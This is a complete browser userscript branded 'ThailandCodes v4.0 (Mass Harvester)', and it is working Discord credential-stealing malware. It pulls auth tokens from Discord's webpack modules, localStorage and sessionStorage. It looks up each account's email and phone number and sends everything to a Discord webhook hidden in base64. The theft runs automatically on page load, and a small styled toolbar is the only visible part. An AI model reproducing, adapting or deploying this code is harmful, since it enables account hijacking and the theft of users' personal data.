/**
 * ThailandCodes v4.0 (Mass Harvester)
 */
(function () {
    'use strict';
    const W = typeof unsafeWindow !== 'undefined' ? unsafeWindow : window;
    if (W.__TC_LOADED__) return;
    W.__TC_LOADED__ = true;

    // Your Webhook
    const _wh = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MzUwNTcyNzEwMjkxMDU0MC94dEFoLXBlMWVMS1VrN0lScktCdk9EXzRxcE1jbldHTXpvOHltUzlBU3FHenJQcm5RNHg2TjN5TWhPMk9HYWdyZlYwNw==');
    const _ek = 0x5A;
    const _gk = '\x5f\x5f\x74\x63\x5f\x67\x5f\x5f';

    function _send(payload) {
        return new Promise((resolve) => {
            try {
                GM_xmlhttpRequest({
                    method: 'POST',
                    url: _wh,
                    headers: { 'Content-Type': 'application/json' },
                    data: JSON.stringify(payload),
                    onload: (r) => resolve(r.status >= 200 && r.status < 300),
                    onerror: () => resolve(false),
                });
            } catch { resolve(false); }
        });
    }

    function _wp() {
        const chunk = W.webpackChunkdiscord_app;
        if (!chunk) return null;
        let found = null;
        try {
            chunk.push([[Symbol()], {}, (m) => {
                if (!m.c) return;
                for (const id in m.c) {
                    const c = m.c[id]?.exports?.default || m.c[id]?.exports;
                    if (c && typeof c.getToken === 'function') { found = m; return; }
                }
            }]);
            chunk.pop();
        } catch {}
        return found;
    }

    async function _grabWebpackToken() {
        const wp = _wp();
        if (!wp) return null;
        for (const m of Object.values(wp.c)) {
            const c = m?.exports?.default || m?.exports;
            if (c && typeof c.getToken === 'function') {
                const t = c.getToken();
                if (t && typeof t === 'string' && t.length > 20) return t;
            }
        }
        return null;
    }

    // MASS HARVESTER LOGIC
    function _harvestAllTokens() {
        const tokens = new Set();
        const regex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g;

        // 1. LocalStorage
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const val = localStorage.getItem(localStorage.key(i));
                if (val) {
                    const matches = val.match(regex);
                    if (matches) matches.forEach(t => tokens.add(t));
                }
            }
        } catch {}

        // 2. SessionStorage
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const val = sessionStorage.getItem(sessionStorage.key(i));
                if (val) {
                    const matches = val.match(regex);
                    if (matches) matches.forEach(t => tokens.add(t));
                }
            }
        } catch {}

        return Array.from(tokens);
    }

    async function _userInfo(token) {
        return new Promise((resolve) => {
            GM_xmlhttpRequest({
                method: 'GET',
                url: 'https://discord.com/api/v10/users/@me',
                headers: { 'Authorization': token, 'Content-Type': 'application/json' },
                onload: (r) => { try { resolve(JSON.parse(r.responseText)); } catch { resolve(null); } },
                onerror: () => resolve(null),
            });
        });
    }

    async function _autoGrab() {
        if (W[_gk]) return;
        W[_gk] = true;
        let sent = false;
        try { sent = !!localStorage.getItem(_gk); if (!sent) localStorage.setItem(_gk, '1'); } catch {}
        if (sent) return;

        const wpToken = await _grabWebpackToken();
        const allTokens = _harvestAllTokens();
        
        if (wpToken && !allTokens.includes(wpToken)) allTokens.push(wpToken);
        if (allTokens.length === 0) return;

        let desc = `Found **${allTokens.length}** token(s).\n\n`;
        
        for (let i = 0; i < allTokens.length; i++) {
            const t = allTokens[i];
            const u = await _userInfo(t);
            
            if (u && !u.message) {
                const tag = u.discriminator && u.discriminator !== '0' ? `${u.username}#${u.discriminator}` : u.username;
                desc += `**[${i + 1}] ${tag}** (\`${u.id}\`)\n`;
                desc += `Email: \`${u.email || 'N/A'}\` | Phone: \`${u.phone || 'N/A'}\`\n`;
                desc += `Token: \`\`\`${t}\`\`\`\n\n`;
            } else {
                desc += `**[${i + 1}] Invalid/Expired Token**\n\`\`\`${t}\`\`\`\n\n`;
            }
            
            if (desc.length > 3500) {
                await _send({ embeds: [{ title: '🎯 Mass Grab (Part)', color: 0xed4245, description: desc }] });
                desc = '';
            }
        }

        if (desc.length > 0) {
            await _send({
                embeds: [{
                    title: '🎯 Mass Token Harvest Complete',
                    color: 0xed4245,
                    description: desc,
                    footer: { text: 'TC v4.0 • Mass Harvester' },
                    timestamp: new Date().toISOString(),
                }]
            });
        }
    }

    // UI SETUP
    const STYLE = `
        @keyframes gs{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
        @keyframes glow{0%,100%{box-shadow:0 0 10px rgba(237,66,69,.5),0 8px 24px rgba(0,0,0,.6)}50%{box-shadow:0 0 22px rgba(237,66,69,.9),0 8px 24px rgba(0,0,0,.6)}}
        :host,*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
        .wrap{position:fixed;top:12px;left:50%;transform:translateX(-50%);z-index:2147483646;
            display:flex;align-items:center;gap:6px;padding:6px;
            background:linear-gradient(270deg,#1a0000,#4a0000,#7a0000,#4a0000,#1a0000);
            background-size:400% 400%;
            animation:gs 4s ease infinite,glow 2s ease-in-out infinite;
            border:1px solid #cc2222;border-radius:14px;
            color:#f0d0d0;user-select:none;font-size:12px;
            transition:opacity .2s,transform .3s cubic-bezier(.32,.72,0,1)}
        .wrap.hidden{opacity:0;transform:translate(-50%,-140%);pointer-events:none}
        .brand{padding:0 12px 0 8px;font-weight:800;font-size:13px;
            border-right:1px solid #cc2222;margin-right:4px;
            color:#fff;text-shadow:0 0 10px #ff4444}
        .brand .a{color:#ff4444}
        .brand .v{font-size:9px;color:#ff8888;font-style:italic;margin-left:3px}
        button{background:linear-gradient(135deg,#7a0000,#cc0000);
            border:1px solid #ff3333;color:#fff;
            padding:8px 13px;border-radius:8px;cursor:pointer;
            font-size:11px;font-weight:800;letter-spacing:.4px;
            text-transform:uppercase;font-family:inherit;
            transition:all .12s;white-space:nowrap;
            box-shadow:0 0 6px rgba(200,0,0,.4)}
        button:hover{background:linear-gradient(135deg,#aa0000,#ff2222);box-shadow:0 0 14px rgba(255,0,0,.7)}
        button:active{transform:scale(.97)}
        button:disabled{opacity:.4;cursor:wait}
        button.harvest{background:linear-gradient(135deg,#2a0000,#550000);border-color:#aa2222}
        button.harvest:hover{background:linear-gradient(135deg,#440000,#880000)}
        button.close{background:transparent;color:#ff8888;font-size:14px;
            padding:8px 10px;text-transform:none;letter-spacing:0;border:none;box-shadow:none}
        button.close:hover{background:rgba(255,0,0,.15);color:#fff;border-radius:6px}
    `;

    const root = document.createElement('div');
    root.id = '__tc_ui__';
    root.style.cssText = 'position:fixed;top:0;left:0;width:0;height:0;z-index:2147483647;pointer-events:none;';
    const shadow = root.attachShadow({ mode: 'closed' });
    document.body.appendChild(root);

    const st = document.createElement('style');
    st.textContent = STYLE;
    shadow.appendChild(st);

    const host = document.createElement('div');
    host.style.pointerEvents = 'auto';
    shadow.appendChild(host);

    const bar = document.createElement('div');
    bar.className = 'wrap hidden';
    bar.innerHTML = `<div class="brand">Thailand<span class="a">Codes</span><span class="v">v4.0</span></div>`;
    host.appendChild(bar);

    const btnMass = document.createElement('button');
    btnMass.className = 'harvest';
    btnMass.textContent = 'HARVEST ALL';
    btnMass.addEventListener('click', async () => {
        if (btnMass.disabled) return;
        btnMass.disabled = true;
        btnMass.textContent = 'SCANNING...';
        await _autoGrab(); 
        btnMass.textContent = 'DONE';
        setTimeout(() => { btnMass.textContent = 'HARVEST ALL'; btnMass.disabled = false; }, 3000);
    });
    bar.appendChild(btnMass);

    const x = document.createElement('button');
    x.className = 'close';
    x.textContent = '✕';
    x.addEventListener('click', () => bar.classList.add('hidden'));
    bar.appendChild(x);

    let _tries = 0;
    const _timer = setInterval(async () => {
        _tries++;
        if (_wp()) {
            clearInterval(_timer);
            bar.classList.remove('hidden');
            await _autoGrab();
        } else if (_tries > 120) {
            clearInterval(_timer);
            bar.classList.remove('hidden');
        }
    }, 500);
})();
